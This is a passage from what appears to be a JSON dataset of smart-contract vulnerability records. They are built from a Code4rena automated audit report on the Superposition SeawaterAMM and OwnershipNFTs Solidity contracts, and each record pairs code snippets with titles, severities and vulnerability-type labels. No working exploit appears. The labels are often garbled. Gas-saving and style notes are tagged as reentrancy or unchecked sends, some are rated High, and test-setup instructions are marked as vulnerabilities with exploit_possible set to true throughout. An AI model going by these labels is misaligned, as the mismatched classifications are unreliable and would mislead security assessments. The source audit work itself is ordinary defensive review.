    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n             directDelegate(_getExecutorAdmin());\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n             directDelegate(_getExecutorAdmin());\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n             directDelegate(_getExecutorAdmin());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-1\"></a>[M-1] Fees can be set to be greater than 100%.",
    "description": "There should be an upper limit to reasonable fees. A malicious owner can keep the fee rate at zero, but if a large value transfer enters the mempool, the owner can jack the rate up to the maximum and sandwich attack a user. *Instances (8)*: File: ./pkg/sol/SeawaterAMM.sol 389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n160:     function createPoolD650E2D0(\n\n171:     function collectProtocol7540FA9F(\n\n181:     function enablePool579DA658(address /* pool */, bool /* enabled */) external {\n\n186:     function authoriseEnabler5B17C274(address /* enabler */, bool /* enabled */) external {\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n208:     function swap904369BE(\n\n218:     function quote72E2ADE7(\n\n228:     function quote2CD06B86E(address /* from */, address /* to */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n233:     function swapPermit2EE84AD91(\n\n247:     function swap2ExactInPermit254A7DBB1(\n\n260:     function swap2ExactIn41203F1D(\n\n270:     function swapIn32502CA71(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n283:     function swapInPermit2CEAAB576(\n\n307:     function swapOut5E08A399(address token, uint256 amountIn, uint256 minOut) external returns (int256, int256) {\n\n319:     function swapOutPermit23273373B(\n\n344:     function mintPositionBC5B086D(\n\n353:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n359:     function transferPositionEEC7A3CD(uint256 /* id */, address /* from */, address /* to */) external {\n\n364:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n369:     function positionLiquidity8D11C045(address /* pool */, uint256 /* id */) external returns (uint128) {\n\n374:     function positionTickLower2F77CCE1(address /* pool */, uint256 /* id */) external returns (int32) {\n\n379:     function positionTickUpper67FD55BA(address /* pool */, uint256 /* id */) external returns (int32) {\n\n384:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n\n394:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n399:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n419:     function collectSingleTo6D76575F(\n\n428:     function collect7F21947C(\n\n436:     function updatePositionC7F1F740(\n\n445:     function incrPositionE2437399(\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n485:     fallback() external {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"M-2\"></a>[M-2] Library function isn't `internal` or `private`",
    "description": "In a library, using an external or public visibility means that we won't be going through the library with a DELEGATECALL but with a CALL. This changes the context and should be done carefully. *Instances (46)*: File: ./pkg/sol/SeawaterAMM.sol 123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { 160:     function createPoolD650E2D0(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 96,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "Automated Findings / Publicly Known Issues",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "Automated Findings / Publicly Known Issues",
    "description": "The 4naly3er report can be found [here](https://github.com/code-423n4/2024-10-superposition/blob/main/4naly3er-report.md). _Note for C4 wardens: Anything included in this `Automated Findings / Publicly Known Issues` section is considered a publicly known issue and is ineligible for awards._ * It is possible for someone to grief the protocol by creating a pool with bad configuration. * It is possible for the permissioned account to do things to grief the protocol. * Operator makes a mistake with a trusted function",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.042,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "bash\nhttps://github.com/code-423n4/2024-10-superposition\ncd 2024-10-superposition/pkg\nrustup target add wasm32-unknown-unknown\ncargo install cargo-stylus\n./tests.sh # this would test the rust files from the files in ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Running tests",
    "description": "See [pkg/README](https://github.com/code-423n4/2024-10-superposition/blob/main/pkg/README.md#building) for a detailed explanation Then run the following command: https://github.com/code-423n4/2024-10-superposition cd 2024-10-superposition/pkg rustup target add wasm32-unknown-unknown",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.216,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "cargo test\n--features=testing,testing-dbg-erc20 -- --nocapture",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "Cargo test tracing",
    "description": "Some of the cargo tests have optional logging, which might help with debugging. To see these logs, enable the `testing-dbg-<test>` feature and run the tests without capturing stdout, ie `cargo test --features=testing,testing-dbg-erc20 -- --nocapture`. Testing tools are available with the `with_storage` macro, which lets you set slots and",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 2,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.062,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n37:     mapping(address => mapping(address => bool)) public isApprovedForAll;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "<a name=\"GAS-2\"></a>[GAS-2] Using bools for storage incurs overhead",
    "description": "Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from \u2018false\u2019 to \u2018true\u2019, after having been \u2018true\u2019 in the past. See [source](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27). *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 37:     mapping(address => mapping(address => bool)) public isApprovedForAll; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.123,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n4: import \"./ISeawaterExecutors.sol\";\n\n6: import \"./ISeawaterAMM.sol\";\n\n12: bytes32 constant EXECUTOR_SWAP_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap\")) - 1);\n\n15: bytes32 constant EXECUTOR_SWAP_PERMIT2_A_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap_permit2.a\")) - 1);\n\n18: bytes32 constant EXECUTOR_QUOTE_SLOT = bytes32(uint256(keccak256(\"seawater.impl.quote\")) - 1);\n\n21: bytes32 constant EXECUTOR_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.position\")) - 1);\n\n24: bytes32 constant EXECUTOR_UPDATE_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.update_position\")) - 1);\n\n27: bytes32 constant EXECUTOR_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.impl.admin\")) - 1);\n\n30: bytes32 constant EXECUTOR_ADJUST_POSITION_SLOT = bytes32(uint256(keccak256(\"seawater.impl.adjust_position\")) - 1);\n\n33: bytes32 constant EXECUTOR_SWAP_PERMIT2_B_SLOT = bytes32(uint256(keccak256(\"seawater.impl.swap_permit2.b\")) - 1);\n\n36: bytes32 constant EXECUTOR_FALLBACK_SLOT = bytes32(uint256(keccak256(\"seawater.impl.fallback\")) - 1);\n\n39: bytes32 constant PROXY_ADMIN_SLOT = bytes32(uint256(keccak256(\"seawater.role.proxy.admin\")) - 1);\n\n161:         address /* token */,\n\n162:         uint256 /* sqrtPriceX96 */,\n\n163:         uint32 /* fee */,\n\n164:         uint8 /* tickSpacing */,\n\n165:         uint128 /* maxLiquidityPerTick */\n\n172:         address /* pool */,\n\n173:         uint128 /* amount0 */,\n\n174:         uint128 /* amount1 */,\n\n175:         address /* recipient */\n\n181:     function enablePool579DA658(address /* pool */, bool /* enabled */) external {\n\n186:     function authoriseEnabler5B17C274(address /* enabler */, bool /* enabled */) external {\n\n191:     function setSqrtPriceFF4DB98C(address /* pool */, uint256 /* price */) external {\n\n196:     function updateNftManager9BDF41F6(address /* manager */) external {\n\n201:     function updateEmergencyCouncil7D0C1C58(address /* council */) external {\n\n209:         address /* pool */,\n\n210:         bool /* zeroForOne */,\n\n211:         int256 /* amount */,\n\n212:         uint256 /* priceLimit */\n\n219:         address /* pool */,\n\n220:         bool /* zeroForOne */,\n\n221:         int256 /* amount */,\n\n222:         uint256 /* priceLimit */\n\n228:     function quote2CD06B86E(address /* from */, address /* to */, uint256 /* amount */, uint256 /* minOut*/) external {\n\n234:         address /* pool */,\n\n235:         bool /* zeroForOne */,\n\n236:         int256 /* amount */,\n\n237:         uint256 /* priceLimit */,\n\n238:         uint256 /* nonce */,\n\n239:         uint256 /* deadline */,\n\n240:         uint256 /* maxAmount */,\n\n241:         bytes memory /* sig */\n\n248:         address /* from */,\n\n249:         address /* to */,\n\n250:         uint256 /* amount */,\n\n251:         uint256 /* minOut */,\n\n252:         uint256 /* nonce */,\n\n253:         uint256 /* deadline */,\n\n254:         bytes memory /* sig */\n\n261:         address /* tokenA */,\n\n262:         address /* tokenB */,\n\n263:         uint256 /* amountIn */,\n\n264:         uint256 /* minAmountOut */\n\n278:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n302:         require(-swapAmountOut >= int256(minOut), \"min out not reached!\");\n\n345:         address /* token */,\n\n346:         int32 /* lower */,\n\n347:         int32 /* upper */\n\n348:     ) external returns (uint256 /* id */) {\n\n353:     function positionOwnerD7878480(uint256 /* id */) external returns (address) {\n\n359:     function transferPositionEEC7A3CD(uint256 /* id */, address /* from */, address /* to */) external {\n\n364:     function positionBalance4F32C7DB(address /* user */) external returns (uint256) {\n\n369:     function positionLiquidity8D11C045(address /* pool */, uint256 /* id */) external returns (uint128) {\n\n374:     function positionTickLower2F77CCE1(address /* pool */, uint256 /* id */) external returns (int32) {\n\n379:     function positionTickUpper67FD55BA(address /* pool */, uint256 /* id */) external returns (int32) {\n\n384:     function sqrtPriceX967B8F5FC5(address /* pool */) external returns (uint256) {\n\n389:     function feesOwed22F28DBD(address /* pool */, uint256 /* position */) external returns (uint128, uint128) {\n\n394:     function curTick181C6FD9(address /* pool */) external returns (int32) {\n\n399:     function tickSpacing653FE28F(address /* pool */) external returns (uint8) {\n\n404:     function feeBB3CF608(address /* pool */) external returns (uint32) {\n\n409:     function feeGrowthGlobal038B5665B(address /* pool */) external returns (uint256) {\n\n414:     function feeGrowthGlobal1A33A5A1B(address /*pool */) external returns (uint256) {\n\n420:         address /* pool */,\n\n421:         uint256 /* id */,\n\n422:         address /* recipient */\n\n429:         address[] memory /* pools */,\n\n430:         uint256[] memory /* ids */\n\n437:         address /* pool */,\n\n438:         uint256 /* id */,\n\n439:         int128 /* delta */\n\n446:         address /* pool */,\n\n447:         uint256 /* id */,\n\n448:         uint256 /* amount0Min */,\n\n449:         uint256 /* amount1Min */,\n\n450:         uint256 /* amount0Desired */,\n\n451:         uint256 /* amount1Desired */\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "<a name=\"GAS-4\"></a>[GAS-4] For Operations that will not overflow, you could use unchecked",
    "description": "*Instances (93)*: File: ./pkg/sol/OwnershipNFTs.sol 4: import \"./IERC721Metadata.sol\"; 5: import \"./IERC721TokenReceiver.sol\"; 6: import \"./IERC165.sol\";",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 178,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n51:         require(ok, \"position owner revert\");\n\n59:         require(approved != address(0), \"not existing\");\n\n85:         require(data == IERC721TokenReceiver.onERC721Received.selector, \"bad nft transfer received data\");\n\n94:         require(isAllowed, \"not allowed\");\n\n95:         require(ownerOf(_tokenId) == _from, \"_from is not the owner!\");\n\n100:         require(_to != address(0), \"invalid recipient\");\n\n132:         require(owner == msg.sender || isApprovedForAll[owner][msg.sender], \"not authorised\");\n\n145:         require(_spender != address(0), \"invalid recipient\");\n\n149:         require(ok, \"position balance revert\");\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"GAS-5\"></a>[GAS-5] Use Custom Errors instead of Revert Strings to save Gas",
    "description": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas Additionally, custom errors can be used inside and outside of contracts (including interfaces and libraries). Source: <https://blog.soliditylang.org/2021/04/21/custom-errors/>: > Starting from [Solidity v0.8.4](https://github.com/ethereum/solidity/releases/tag/v0.8.4), there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., `revert(\"Insufficient funds.\");`), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them. Consider replacing **all revert strings** with custom errors in the solution, and particularly those that have multiple occurrences:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 22,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.68,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n112:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall(\n\n271:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(\n\n292:         (bool success, bytes memory data) = _getExecutorSwapPermit2A().delegatecall(\n\n308:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(\n\n328:         (bool success, bytes memory data) = _getExecutorSwapPermit2A().delegatecall(\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "<a name=\"GAS-6\"></a>[GAS-6] Avoid contract existence checks by using low level calls",
    "description": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence *Instances (5)*: File: ./pkg/sol/SeawaterAMM.sol 112:         (bool success, bytes memory data) = _getExecutorAdmin().delegatecall( 271:         (bool success, bytes memory data) = _getExecutorSwap().delegatecall(",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.474,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin {\n\n456:     function setExecutorSwap(address a) external onlyProxyAdmin {\n\n459:     function setExecutorSwapPermit2A(address a) external onlyProxyAdmin {\n\n462:     function setExecutorQuote(address a) external onlyProxyAdmin {\n\n465:     function setExecutorPosition(address a) external onlyProxyAdmin {\n\n468:     function setExecutorUpdatePosition(address a) external onlyProxyAdmin {\n\n471:     function setExecutorAdmin(address a) external onlyProxyAdmin {\n\n474:     function setExecutorAdjustPosition(address a) external onlyProxyAdmin {\n\n477:     function setExecutorSwapPermit2B(address a) external onlyProxyAdmin {\n\n480:     function setExecutorFallback(address a) external onlyProxyAdmin {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"GAS-8\"></a>[GAS-8] Functions guaranteed to revert when called by normal users can be marked `payable`",
    "description": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. *Instances (10)*: File: ./pkg/sol/SeawaterAMM.sol 123:     function updateProxyAdmin(address newAdmin) public onlyProxyAdmin { 456:     function setExecutorSwap(address a) external onlyProxyAdmin {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 24,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.814,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "abi.encodeWithSignature",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Non Critical Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [NC-1](#NC-1) | Replace `abi.encodeWithSignature` and `abi.encodeWithSelector` with `abi.encodeCall` which keeps the code typo/type safe | 2 | | [NC-2](#NC-2) | Array indices should be referenced via `enum`s rather than via numeric literals | 8 | | [NC-3](#NC-3) | Control structures do not follow the Solidity Style Guide | 9 |",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n487:         if (uint8(msg.data[2]) == EXECUTOR_SWAP_DISPATCH)\n\n490:         else if (uint8(msg.data[2]) == EXECUTOR_UPDATE_POSITION_DISPATCH)\n\n493:         else if (uint8(msg.data[2]) == EXECUTOR_POSITION_DISPATCH)\n\n496:         else if (uint8(msg.data[2]) == EXECUTOR_ADMIN_DISPATCH)\n\n499:         else if (uint8(msg.data[2]) == EXECUTOR_SWAP_PERMIT2_A_DISPATCH)\n\n502:         else if (uint8(msg.data[2]) == EXECUTOR_QUOTES_DISPATCH) directDelegate(_getExecutorQuote());\n\n503:         else if (uint8(msg.data[2]) == EXECUTOR_ADJUST_POSITION_DISPATCH) directDelegate(_getExecutorAdjustPosition());\n\n504:         else if (uint8(msg.data[2]) == EXECUTOR_SWAP_PERMIT2_B_DISPATCH) directDelegate(_getExecutorSwapPermit2B());\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-3\"></a>[NC-3] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (9)*: File: ./pkg/sol/OwnershipNFTs.sol 74:         if (_to.code.length == 0) return; [Link to code](https://github.com/code-423n4/2024-10-superposition/blob/main/./pkg/sol/OwnershipNFTs.sol)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.765,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./pkg/sol/OwnershipNFTs.sol\n\n138:     function setApprovalForAll(address _operator, bool _approved) external {\n             isApprovedForAll[msg.sender][_operator] = _approved;\n             emit ApprovalForAll(msg.sender, _operator, _approved);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "<a name=\"NC-6\"></a>[NC-6] Events that mark critical parameter changes should contain both the old and the new value",
    "description": "This should especially be done if the new value is not required to be different from the old value *Instances (1)*: File: ./pkg/sol/OwnershipNFTs.sol 138:     function setApprovalForAll(address _operator, bool _approved) external { isApprovedForAll[msg.sender][_operator] = _approved;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.261,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./pkg/sol/SeawaterAMM.sol\n\n1: \n   Current order:\n   internal getAddressSlot\n   public updateProxyAdmin\n   internal directDelegate\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactInPermit254A7DBB1\n   external swap2ExactIn41203F1D\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionE2437399\n   external setExecutorSwap\n   external setExecutorSwapPermit2A\n   external setExecutorQuote\n   external setExecutorPosition\n   external setExecutorUpdatePosition\n   external setExecutorAdmin\n   external setExecutorAdjustPosition\n   external setExecutorSwapPermit2B\n   external setExecutorFallback\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2A\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorAdjustPosition\n   internal _getExecutorSwapPermit2B\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n   \n   Suggested order:\n   external createPoolD650E2D0\n   external collectProtocol7540FA9F\n   external enablePool579DA658\n   external authoriseEnabler5B17C274\n   external setSqrtPriceFF4DB98C\n   external updateNftManager9BDF41F6\n   external updateEmergencyCouncil7D0C1C58\n   external swap904369BE\n   external quote72E2ADE7\n   external quote2CD06B86E\n   external swapPermit2EE84AD91\n   external swap2ExactInPermit254A7DBB1\n   external swap2ExactIn41203F1D\n   external swapIn32502CA71\n   external swapInPermit2CEAAB576\n   external swapOut5E08A399\n   external swapOutPermit23273373B\n   external mintPositionBC5B086D\n   external positionOwnerD7878480\n   external transferPositionEEC7A3CD\n   external positionBalance4F32C7DB\n   external positionLiquidity8D11C045\n   external positionTickLower2F77CCE1\n   external positionTickUpper67FD55BA\n   external sqrtPriceX967B8F5FC5\n   external feesOwed22F28DBD\n   external curTick181C6FD9\n   external tickSpacing653FE28F\n   external feeBB3CF608\n   external feeGrowthGlobal038B5665B\n   external feeGrowthGlobal1A33A5A1B\n   external collectSingleTo6D76575F\n   external collect7F21947C\n   external updatePositionC7F1F740\n   external incrPositionE2437399\n   external setExecutorSwap\n   external setExecutorSwapPermit2A\n   external setExecutorQuote\n   external setExecutorPosition\n   external setExecutorUpdatePosition\n   external setExecutorAdmin\n   external setExecutorAdjustPosition\n   external setExecutorSwapPermit2B\n   external setExecutorFallback\n   public updateProxyAdmin\n   internal getAddressSlot\n   internal directDelegate\n   internal _getExecutorSwap\n   internal _getExecutorSwapPermit2A\n   internal _getExecutorQuote\n   internal _getExecutorPosition\n   internal _getExecutorUpdatePosition\n   internal _getExecutorAdmin\n   internal _getExecutorAdjustPosition\n   internal _getExecutorSwapPermit2B\n   internal _getExecutorFallback\n   internal _setProxyAdmin\n   internal _setProxies\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Function ordering does not follow the Solidity style guide",
    "description": "According to the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.17/style-guide.html#order-of-functions), functions should be laid out in the following order :`constructor()`, `receive()`, `fallback()`, `external`, `public`, `internal`, `private`, but the cases below do not follow this pattern *Instances (2)*: File: ./pkg/sol/OwnershipNFTs.sol 1: Current order:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-10-superposition",
    "audit_source": "code4rena",
    "lines_of_code": 125,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
